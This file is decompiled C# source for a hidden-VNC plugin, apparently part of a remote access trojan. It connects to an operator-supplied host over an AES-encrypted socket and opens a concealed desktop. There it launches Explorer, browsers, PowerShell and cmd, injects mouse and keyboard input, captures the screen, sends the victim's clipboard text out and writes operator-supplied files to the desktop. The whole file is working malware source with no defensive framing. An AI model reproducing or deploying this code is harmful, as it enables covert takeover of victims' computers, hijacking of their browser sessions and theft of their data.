using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Methods.Native;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using Plugin.S.OpenApp;
using S.OpenApp;

namespace HVNC
{
	// Token: 0x02000010 RID: 16
	internal class Plugin
	{
		// Token: 0x06000062 RID: 98 RVA: 0x00004230 File Offset: 0x00002430
		public static void Run(string H, string P, string SL, string K, string id)
		{
			try
			{
				Plugin.Settings.Host = H;
				Plugin.Settings.Port = P;
				Plugin.Settings.SPL = SL;
				Plugin.Settings.KEY = K;
				Plugin.Settings.IDD = id;
				Plugin.T1.Start();
				Plugin.T2.Start();
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x04000030 RID: 48
		public static Thread T1 = new Thread(new ThreadStart(Plugin.ClientSocket.BeginConnect));

		// Token: 0x04000031 RID: 49
		public static Thread T2 = new Thread(new ThreadStart(Plugin.ClientSocket.Ping));

		// Token: 0x0200001B RID: 27
		public class Settings
		{
			// Token: 0x04000054 RID: 84
			public static string Host;

			// Token: 0x04000055 RID: 85
			public static string Port;

			// Token: 0x04000056 RID: 86
			public static string KEY;

			// Token: 0x04000057 RID: 87
			public static string SPL;

			// Token: 0x04000058 RID: 88
			public static string IDD;
		}

		// Token: 0x0200001C RID: 28
		public class ClientSocket
		{
			// Token: 0x06000098 RID: 152 RVA: 0x00004414 File Offset: 0x00002614
			public static void BeginConnect()
			{
				Plugin.ClientSocket.S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				Plugin.ClientSocket.BufferLength = -1L;
				Plugin.ClientSocket.Buffer = new byte[1];
				Plugin.ClientSocket.MS = new MemoryStream();
				Plugin.ClientSocket.S.ReceiveBufferSize = 51200;
				Plugin.ClientSocket.S.SendBufferSize = 51200;
				try
				{
					Plugin.ClientSocket.S.Connect(Plugin.Settings.Host, Conversions.ToInteger(Plugin.Settings.Port));
					Plugin.ClientSocket.isConnected = true;
					try
					{
						HandelNative.SetProcessDpiAwareness(2);
					}
					catch
					{
					}
					Plugin.Helper.ScreenX = Screen.PrimaryScreen.Bounds.Width;
					Plugin.Helper.ScreenY = Screen.PrimaryScreen.Bounds.Height;
					Plugin.ClientSocket.Send(string.Concat(new string[]
					{
						"FormHVNC",
						Plugin.Settings.SPL,
						Plugin.Settings.IDD,
						Plugin.Settings.SPL,
						Plugin.Helper.ScreenX.ToString(),
						Plugin.Settings.SPL,
						Plugin.Helper.ScreenY.ToString()
					}));
					Plugin.Helper.HigherThan81 = Conversions.ToBoolean(Plugin.Helper.Isgreaterorequalto81());
					Plugin.Helper.OpenWindowsDesktop();
					Plugin.ClientSocket.S.BeginReceive(Plugin.ClientSocket.Buffer, 0, Plugin.ClientSocket.Buffer.Length, SocketFlags.None, new AsyncCallback(Plugin.ClientSocket.BeginReceive), Plugin.ClientSocket.S);
				}
				catch (Exception ex)
				{
					Plugin.ClientSocket.isDisconnected();
				}
			}

			// Token: 0x06000099 RID: 153 RVA: 0x00004588 File Offset: 0x00002788
			public static void BeginReceive(IAsyncResult ar)
			{
				bool flag = !Plugin.ClientSocket.isConnected;
				if (flag)
				{
					Plugin.ClientSocket.isDisconnected();
				}
				try
				{
					int num = Plugin.ClientSocket.S.EndReceive(ar);
					bool flag2 = num > 0;
					if (flag2)
					{
						bool flag3 = Plugin.ClientSocket.BufferLength == -1L;
						if (flag3)
						{
							bool flag4 = Plugin.ClientSocket.Buffer[0] == 0;
							if (flag4)
							{
								Plugin.ClientSocket.BufferLength = Conversions.ToLong(Plugin.Helper.BS(Plugin.ClientSocket.MS.ToArray()));
								Plugin.ClientSocket.MS.Dispose();
								Plugin.ClientSocket.MS = new MemoryStream();
								bool flag5 = Plugin.ClientSocket.BufferLength == 0L;
								if (flag5)
								{
									Plugin.ClientSocket.BufferLength = -1L;
									Plugin.ClientSocket.S.BeginReceive(Plugin.ClientSocket.Buffer, 0, Plugin.ClientSocket.Buffer.Length, SocketFlags.None, new AsyncCallback(Plugin.ClientSocket.BeginReceive), Plugin.ClientSocket.S);
									return;
								}
								Plugin.ClientSocket.Buffer = new byte[(int)(Plugin.ClientSocket.BufferLength - 1L + 1L)];
							}
							else
							{
								Plugin.ClientSocket.MS.WriteByte(Plugin.ClientSocket.Buffer[0]);
							}
						}
						else
						{
							Plugin.ClientSocket.MS.Write(Plugin.ClientSocket.Buffer, 0, num);
							bool flag6 = Plugin.ClientSocket.MS.Length == Plugin.ClientSocket.BufferLength;
							if (flag6)
							{
								Thread thread = new Thread(new ParameterizedThreadStart(Plugin.ClientSocket.BeginRead));
								thread.Start(Plugin.ClientSocket.MS.ToArray());
								Plugin.ClientSocket.BufferLength = -1L;
								Plugin.ClientSocket.MS.Dispose();
								Plugin.ClientSocket.MS = new MemoryStream();
								Plugin.ClientSocket.Buffer = new byte[1];
							}
							else
							{
								Plugin.ClientSocket.Buffer = new byte[(int)(Plugin.ClientSocket.BufferLength - Plugin.ClientSocket.MS.Length - 1L + 1L)];
							}
						}
						Plugin.ClientSocket.S.BeginReceive(Plugin.ClientSocket.Buffer, 0, Plugin.ClientSocket.Buffer.Length, SocketFlags.None, new AsyncCallback(Plugin.ClientSocket.BeginReceive), Plugin.ClientSocket.S);
					}
					else
					{
						Plugin.ClientSocket.isDisconnected();
					}
				}
				catch (Exception ex)
				{
					Plugin.ClientSocket.isDisconnected();
				}
			}

			// Token: 0x0600009A RID: 154 RVA: 0x0000478C File Offset: 0x0000298C
			public static void BeginRead(object b)
			{
				try
				{
					byte[] b2 = (byte[])b;
					Plugin.Messages.Read(b2);
				}
				catch (Exception ex)
				{
					Debug.WriteLine(ex.Message);
				}
			}

			// Token: 0x0600009B RID: 155 RVA: 0x000047D0 File Offset: 0x000029D0
			public static void Send(string msg)
			{
				try
				{
					using (MemoryStream memoryStream = new MemoryStream())
					{
						byte[] array = Plugin.Helper.AES_Encryptor(Plugin.Helper.SB(msg));
						byte[] array2 = Plugin.Helper.SB(array.Length.ToString() + Conversions.ToChar("\0").ToString());
						memoryStream.Write(array2, 0, array2.Length);
						memoryStream.Write(array, 0, array.Length);
						Plugin.ClientSocket.S.Poll(-1, SelectMode.SelectWrite);
						Plugin.ClientSocket.S.Send(memoryStream.ToArray(), 0, (int)memoryStream.Length, SocketFlags.None);
					}
				}
				catch (Exception ex)
				{
					Plugin.ClientSocket.isDisconnected();
				}
			}

			// Token: 0x0600009C RID: 156 RVA: 0x00004894 File Offset: 0x00002A94
			public static void isDisconnected()
			{
				Plugin.ClientSocket.isConnected = false;
				try
				{
					Plugin.ClientSocket.S.Close();
					Plugin.ClientSocket.S.Dispose();
				}
				catch (Exception ex)
				{
					Debug.WriteLine(ex.Message);
				}
				try
				{
					Plugin.ClientSocket.MS.Close();
					Plugin.ClientSocket.MS.Dispose();
				}
				catch (Exception ex2)
				{
					Debug.WriteLine(ex2.Message);
				}
				try
				{
					Plugin.T1.Abort();
				}
				catch (Exception ex3)
				{
					Debug.WriteLine(ex3.Message);
				}
				try
				{
					Plugin.T2.Abort();
				}
				catch (Exception ex4)
				{
					Debug.WriteLine(ex4.Message);
				}
			}

			// Token: 0x0600009D RID: 157 RVA: 0x00004978 File Offset: 0x00002B78
			public static void Ping()
			{
				for (;;)
				{
					Thread.Sleep(30000);
					try
					{
						bool connected = Plugin.ClientSocket.S.Connected;
						if (connected)
						{
							using (MemoryStream memoryStream = new MemoryStream())
							{
								byte[] array = Plugin.Helper.AES_Encryptor(Plugin.Helper.SB("PING?"));
								byte[] array2 = Plugin.Helper.SB(array.Length.ToString() + Conversions.ToChar("\0").ToString());
								memoryStream.Write(array2, 0, array2.Length);
								memoryStream.Write(array, 0, array.Length);
								Plugin.ClientSocket.S.Poll(-1, SelectMode.SelectWrite);
								Plugin.ClientSocket.S.Send(memoryStream.ToArray(), 0, (int)memoryStream.Length, SocketFlags.None);
								GC.Collect();
							}
						}
					}
					catch (Exception ex)
					{
						Plugin.ClientSocket.isDisconnected();
					}
				}
			}

			// Token: 0x04000059 RID: 89
			public static bool isConnected = false;

			// Token: 0x0400005A RID: 90
			public static Socket S;

			// Token: 0x0400005B RID: 91
			public static long BufferLength = 0L;

			// Token: 0x0400005C RID: 92
			public static byte[] Buffer;

			// Token: 0x0400005D RID: 93
			public static MemoryStream MS = new MemoryStream();
		}

		// Token: 0x0200001D RID: 29
		public class Messages
		{
			// Token: 0x060000A0 RID: 160 RVA: 0x00004A98 File Offset: 0x00002C98
			public static void Read(byte[] b)
			{
				try
				{
					string[] array = Strings.Split(Plugin.Helper.BS(Plugin.Helper.AES_Decryptor(b)), Conversions.ToString(Plugin.Settings.SPL), -1, CompareMethod.Binary);
					string text = array[0] ?? "";
					string text2 = text;
					uint num = <PrivateImplementationDetails>.ComputeStringHash(text2);
					if (num <= 2120177073U)
					{
						if (num <= 580495150U)
						{
							if (num <= 387066203U)
							{
								if (num != 228965536U)
								{
									if (num != 290994579U)
									{
										if (num == 387066203U)
										{
											if (text2 == "CloseWindow")
											{
												HideDesktop.Load(Plugin.Helper.HVNCDesktop);
												HandelMouse.CloseWindow();
											}
										}
									}
									else if (text2 == "MouseRightUp")
									{
										Debug.WriteLine("MouseRightUp :" + array[1] + ";" + array[2]);
										HideDesktop.Load(Plugin.Helper.HVNCDesktop);
										int x = Conversions.ToInteger(array[1]);
										int y = Conversions.ToInteger(array[2]);
										HandelMouse.MouseRghitUp(x, y);
									}
								}
								else if (text2 == "MouseLeftUp")
								{
									Debug.WriteLine("MouseLeftUp :" + array[1] + ";" + array[2]);
									HideDesktop.Load(Plugin.Helper.HVNCDesktop);
									int x2 = Conversions.ToInteger(array[1]);
									int y2 = Conversions.ToInteger(array[2]);
									HandelMouse.MouseLeftUp(x2, y2);
								}
							}
							else if (num != 397063008U)
							{
								if (num != 460963510U)
								{
									if (num == 580495150U)
									{
										if (text2 == "CustomOpen")
										{
											HideDesktop.Load(Plugin.Helper.HVNCDesktop);
											CustomOpen.Open(array[1], array[2]);
										}
									}
								}
								else if (text2 == "MinTop")
								{
									HideDesktop.Load(Plugin.Helper.HVNCDesktop);
									HandelMouse.MinTop();
								}
							}
							else if (text2 == "KeyboardDown")
							{
								HideDesktop.Load(Plugin.Helper.HVNCDesktop);
								HandelMouse.KeyboardDown(array[1]);
							}
						}
						else if (num <= 1273004675U)
						{
							if (num != 979156542U)
							{
								if (num != 1201064792U)
								{
									if (num == 1273004675U)
									{
										if (text2 == "MouseDoubleClick")
										{
											Debug.WriteLine("MouseDoubleClick :" + array[1] + ";" + array[2]);
											HideDesktop.Load(Plugin.Helper.HVNCDesktop);
											int x3 = Conversions.ToInteger(array[1]);
											int y3 = Conversions.ToInteger(array[2]);
											HandelMouse.MouseDuoblClieck(x3, y3);
										}
									}
								}
								else if (text2 == "PowerShell")
								{
									HideDesktop.Load(Plugin.Helper.HVNCDesktop);
									PowerShell.Open();
								}
							}
							else if (text2 == "FireFoxBrowser")
							{
								HideDesktop.Load(Plugin.Helper.HVNCDesktop);
								FireFox.OpenFireFoxBrowser();
							}
						}
						else if (num != 1498002838U)
						{
							if (num != 1694428507U)
							{
								if (num == 2120177073U)
								{
									if (text2 == "ScrollUp")
									{
										HideDesktop.Load(Plugin.Helper.HVNCDesktop);
										HandelMouse.ScrollUp();
									}
								}
							}
							else if (text2 == "Cap")
							{
								bool flag = !Plugin.Helper.IsRunning;
								if (flag)
								{
								}
								HideDesktop.Load(Plugin.Helper.HVNCDesktop);
								Plugin.Helper.IsRunning = true;
								RemoteDesktop.Capture(Conversions.ToInteger(array[1]), Conversions.ToDouble(array[2]));
							}
						}
						else if (text2 == "CloseHVNC")
						{
							Plugin.ClientSocket.isDisconnected();
						}
					}
					else if (num <= 3729384612U)
					{
						if (num <= 3007971976U)
						{
							if (num != 2882242197U)
							{
								if (num != 2920202261U)
								{
									if (num == 3007971976U)
									{
										if (text2 == "Paste")
										{
											HideDesktop.Load(Plugin.Helper.HVNCDesktop);
											HandleClipboard.Paste(array[1]);
										}
									}
								}
								else if (text2 == "DeskDrop")
								{
									string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
									File.WriteAllBytes(folderPath + "\\" + array[1], Plugin.Helper.Decompress(Convert.FromBase64String(array[2])));
								}
							}
							else if (text2 == "MouseLeftDown")
							{
								Debug.WriteLine("MouseLeftDown :" + array[1] + ";" + array[2]);
								HideDesktop.Load(Plugin.Helper.HVNCDesktop);
								int x4 = Conversions.ToInteger(array[1]);
								int y4 = Conversions.ToInteger(array[2]);
								HandelMouse.MouseLeftDown(x4, y4);
							}
						}
						else if (num != 3436623867U)
						{
							if (num != 3569528248U)
							{
								if (num == 3729384612U)
								{
									if (text2 == "EdgeBrowser")
									{
										HideDesktop.Load(Plugin.Helper.HVNCDesktop);
										Edge.OpenEdgeBrowser();
									}
								}
							}
							else if (text2 == "ScrollDown")
							{
								HideDesktop.Load(Plugin.Helper.HVNCDesktop);
								HandelMouse.ScrollDown();
							}
						}
						else if (text2 == "BraveBrowser")
						{
							HideDesktop.Load(Plugin.Helper.HVNCDesktop);
							Brave.OpenBraveBrowser();
						}
					}
					else if (num <= 3906611148U)
					{
						if (num != 3862896704U)
						{
							if (num != 3863123910U)
							{
								if (num == 3906611148U)
								{
									if (text2 == "CopyClib")
									{
										Plugin.ClientSocket.Send("ClibHVNC" + Plugin.Settings.SPL + Plugin.Helper.GetText());
									}
								}
							}
							else if (text2 == "MouseRightDown")
							{
								Debug.WriteLine("MouseRightDown :" + array[1] + ";" + array[2]);
								HideDesktop.Load(Plugin.Helper.HVNCDesktop);
								int x5 = Conversions.ToInteger(array[1]);
								int y5 = Conversions.ToInteger(array[2]);
								HandelMouse.MouseRightDown(x5, y5);
							}
						}
						else if (text2 == "CommandPrompt")
						{
							HideDesktop.Load(Plugin.Helper.HVNCDesktop);
							CommandPrompt.Open();
						}
					}
					else if (num != 4019906641U)
					{
						if (num != 4029935833U)
						{
							if (num == 4154072204U)
							{
								if (text2 == "RestoreMaxTop")
								{
									HideDesktop.Load(Plugin.Helper.HVNCDesktop);
									HandelMouse.RestoreMaxTop();
								}
							}
						}
						else if (text2 == "ChromeBrowser")
						{
							HideDesktop.Load(Plugin.Helper.HVNCDesktop);
							Chrome.OpenChromeBrowser();
						}
					}
					else if (text2 == "MouseMove")
					{
						Debug.WriteLine("MouseMove :" + array[1] + ";" + array[2]);
						HideDesktop.Load(Plugin.Helper.HVNCDesktop);
						int x6 = Conversions.ToInteger(array[1]);
						int y6 = Conversions.ToInteger(array[2]);
						HandelMouse.MouseMove(x6, y6);
					}
				}
				catch (Exception ex)
				{
					Debug.WriteLine(ex.Message);
				}
			}
		}

		// Token: 0x0200001E RID: 30
		internal static class Helper
		{
			// Token: 0x060000A2 RID: 162 RVA: 0x00005234 File Offset: 0x00003434
			public static string GetText()
			{
				string ReturnValue = string.Empty;
				Thread thread = new Thread(delegate()
				{
					try
					{
						ReturnValue = Clipboard.GetText();
					}
					catch (Exception ex)
					{
						Debug.WriteLine(ex.Message);
					}
				});
				thread.SetApartmentState(ApartmentState.STA);
				thread.Start();
				thread.Join();
				return ReturnValue;
			}

			// Token: 0x060000A3 RID: 163 RVA: 0x00005288 File Offset: 0x00003488
			public static byte[] Decompress(byte[] input)
			{
				byte[] result;
				using (MemoryStream memoryStream = new MemoryStream(input))
				{
					byte[] array = new byte[4];
					memoryStream.Read(array, 0, 4);
					int num = BitConverter.ToInt32(array, 0);
					using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Decompress))
					{
						byte[] array2 = new byte[num];
						gzipStream.Read(array2, 0, num);
						result = array2;
					}
				}
				return result;
			}

			// Token: 0x060000A4 RID: 164 RVA: 0x00005310 File Offset: 0x00003510
			public static byte[] Compress(byte[] input)
			{
				byte[] result;
				using (MemoryStream memoryStream = new MemoryStream())
				{
					byte[] bytes = BitConverter.GetBytes(input.Length);
					memoryStream.Write(bytes, 0, 4);
					using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Compress))
					{
						gzipStream.Write(input, 0, input.Length);
						gzipStream.Flush();
					}
					result = memoryStream.ToArray();
				}
				return result;
			}

			// Token: 0x060000A5 RID: 165 RVA: 0x00005394 File Offset: 0x00003594
			public static object Isgreaterorequalto81()
			{
				object obj = null;
				object result;
				try
				{
					OperatingSystem osversion = Environment.OSVersion;
					Version version = osversion.Version;
					bool flag = osversion.Platform == PlatformID.Win32NT;
					if (flag)
					{
						int major = version.Major;
						bool flag2 = major == 6 && version.Minor != 0 && version.Minor != 1;
						if (flag2)
						{
							obj = true;
							return obj;
						}
					}
					obj = false;
					result = obj;
				}
				catch (Exception ex)
				{
					result = obj;
				}
				return result;
			}

			// Token: 0x060000A6 RID: 166 RVA: 0x0000542C File Offset: 0x0000362C
			public static byte[] SB(string s)
			{
				return Encoding.UTF8.GetBytes(s);
			}

			// Token: 0x060000A7 RID: 167 RVA: 0x0000544C File Offset: 0x0000364C
			public static string BS(byte[] b)
			{
				return Encoding.UTF8.GetString(b);
			}

			// Token: 0x060000A8 RID: 168 RVA: 0x00005469 File Offset: 0x00003669
			public static void SendMSG(string msg)
			{
				Plugin.ClientSocket.Send(string.Concat(new string[]
				{
					"HvncMSG",
					Plugin.Settings.SPL,
					Plugin.Settings.IDD,
					Plugin.Settings.SPL,
					msg
				}));
			}

			// Token: 0x060000A9 RID: 169 RVA: 0x000054A4 File Offset: 0x000036A4
			public static byte[] AES_Encryptor(byte[] input)
			{
				RijndaelManaged rijndaelManaged = new RijndaelManaged();
				MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
				try
				{
					rijndaelManaged.Key = md5CryptoServiceProvider.ComputeHash(Plugin.Helper.SB(Plugin.Settings.KEY));
					rijndaelManaged.Mode = CipherMode.ECB;
					ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
					return cryptoTransform.TransformFinalBlock(input, 0, input.Length);
				}
				catch (Exception ex)
				{
					Debug.WriteLine(ex.Message);
				}
				return null;
			}

			// Token: 0x060000AA RID: 170 RVA: 0x00005520 File Offset: 0x00003720
			public static byte[] AES_Decryptor(byte[] input)
			{
				RijndaelManaged rijndaelManaged = new RijndaelManaged();
				MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
				try
				{
					rijndaelManaged.Key = md5CryptoServiceProvider.ComputeHash(Plugin.Helper.SB(Plugin.Settings.KEY));
					rijndaelManaged.Mode = CipherMode.ECB;
					ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
					return cryptoTransform.TransformFinalBlock(input, 0, input.Length);
				}
				catch (Exception ex)
				{
					Debug.WriteLine(ex.Message);
				}
				return null;
			}

			// Token: 0x060000AB RID: 171 RVA: 0x0000559C File Offset: 0x0000379C
			public static void StartExplorer(string strDesktopName)
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Advanced", true);
				int num = Conversions.ToInteger(registryKey.GetValue("TaskbarGlomLevel", true));
				int num2 = 2;
				bool flag = num != num2;
				bool flag2 = flag;
				bool flag3 = flag2;
				if (flag3)
				{
					registryKey.SetValue("TaskbarGlomLevel", num2);
				}
				string path = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\explorer.exe";
				HideDesktop.CreateProcess(path, strDesktopName, true);
				registryKey.SetValue("TaskbarGlomLevel", num);
				registryKey.Close();
				try
				{
					Process process = Process.GetProcessesByName("explorer").FirstOrDefault((Process x) => !Plugin.Helper.PIDs.Any((int y) => y == x.Id));
					bool flag4 = process != null;
					bool flag5 = flag4;
					if (flag5)
					{
						Plugin.Helper.PID = process.Id;
					}
				}
				catch
				{
					Plugin.Helper.SendMSG("Error: Explorer");
				}
			}

			// Token: 0x060000AC RID: 172
			[DllImport("user32.dll")]
			public static extern int GetSystemMetrics(int smIndex);

			// Token: 0x060000AD RID: 173 RVA: 0x000056A4 File Offset: 0x000038A4
			public static void OpenWindowsDesktop()
			{
				try
				{
					HandelMouse.TTTT = Plugin.Helper.GetSystemMetrics(4);
					bool flag = HandelMouse.TTTT < 5;
					bool flag2 = flag;
					if (flag2)
					{
						HandelMouse.TTTT = 20;
					}
					string nameDesktop = Plugin.Helper.NameDesktop;
					Plugin.Helper.HVNCDesktop = HideDesktop.OpenDesktop(nameDesktop);
					bool flag3 = Plugin.Helper.HVNCDesktop == null;
					bool flag4 = flag3;
					bool flag5 = flag4;
					if (flag5)
					{
						Plugin.Helper.HVNCDesktop = HideDesktop.CreateDesktop(nameDesktop);
						HideDesktop.Load(Plugin.Helper.HVNCDesktop);
						bool flag6 = !new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
						bool flag7 = flag6;
						if (flag7)
						{
							Plugin.Helper.StartExplorer(nameDesktop);
						}
						else
						{
							HideDesktop.CreateProcess("powershell.exe -c explorer shell:::{3080F90E-D7AD-11D9-BD98-0000947B0257}", "RemoteDesktopS", false);
						}
					}
					Plugin.Helper.SendMSG("Ready..");
				}
				catch (Exception ex)
				{
					Plugin.Helper.SendMSG("Error: " + ex.Message);
				}
			}

			// Token: 0x17000003 RID: 3
			// (get) Token: 0x060000AE RID: 174 RVA: 0x0000578C File Offset: 0x0000398C
			// (set) Token: 0x060000AF RID: 175 RVA: 0x00005793 File Offset: 0x00003993
			public static bool IsRunning { get; set; }

			// Token: 0x0400005F RID: 95
			public static bool HigherThan81 = false;

			// Token: 0x04000060 RID: 96
			public static int PID = 0;

			// Token: 0x04000061 RID: 97
			private static readonly List<int> PIDs = new List<int>();

			// Token: 0x04000062 RID: 98
			public static string NameDesktop = "RemoteDesktopS";

			// Token: 0x04000063 RID: 99
			public static HideDesktop HVNCDesktop = null;

			// Token: 0x04000064 RID: 100
			public static int ScreenX;

			// Token: 0x04000065 RID: 101
			public static int ScreenY;

			// Token: 0x04000066 RID: 102
			public static IntPtr CheckIntptr;

			// Token: 0x04000067 RID: 103
			public static bool StateCapture = false;

			// Token: 0x04000068 RID: 104
			public static object A = new object();
		}
	}
}
